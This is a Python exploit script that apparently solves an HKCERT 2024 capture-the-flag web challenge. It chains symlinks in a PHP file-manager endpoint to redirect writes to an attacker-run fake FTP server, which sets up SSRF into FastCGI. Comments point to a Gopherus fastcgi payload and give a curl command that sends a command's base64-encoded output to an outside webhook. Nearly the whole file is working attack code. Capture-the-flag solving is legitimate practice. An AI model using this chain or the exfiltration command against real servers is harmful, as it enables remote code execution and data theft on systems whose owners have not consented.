import requests
from urllib.parse import unquote_to_bytes
import sys
import re

# Usage: python3 solve.py {WEB_URL} {YOUR_IP} {YOUR_FAKE_FTP_SERVER_PORT}

web = sys.argv[1]
url = f"{web}/citrus.php%3Fooo.php"

r = requests.get(url)
cookies = r.cookies

def create(filename, target=None):
    requests.post(url, data={"mode": "create", "filename": filename}, cookies=cookies) if target is None \
        else requests.post(url, data={"mode": "create", "filename": filename, "symlink":1, "target":target}, cookies=cookies)

def read(filename):
    return requests.post(url, data={"mode": "read", "filename": filename}, cookies=cookies)

def write(filename, data):
    requests.post(url, data={"mode": "write", "filename": filename, "data": data}, cookies=cookies)

def delete(filename):
    requests.post(url, data={"mode": "delete", "filename": filename}, cookies=cookies)

lhost = sys.argv[2]
lport = sys.argv[3]
fn = f"ftp://{lhost}:{lport}/foo"

# https://github.com/tarunkant/Gopherus
# python2 gopherus.py --exploit fastcgi
# File (absolute path): /var/www/html/*.php (suggest: tangerine.php)
# Terminal command: curl http://{YOUR_WEBHOOK}/?z=`/proof*|base64 -w0`
payload = ""
payload += "%0D%0A"

create("c")
create("b", "c")
create("a", "b")

delete("c")

create("a", fn)

write("c", unquote_to_bytes(payload))
res = read("c")

# If you want to write to another file then read
# Terminal command: /proof* > /tmp/blah
# r = requests.get(url)
# cookies = r.cookies

# create("c")
# create("b", "c")
# create("a", "b")

# delete("c")

# create("a", "/tmp/blah")
# res = read("c")
# print(re.findall(r'hkcert24\{.*\}', res.text)[0])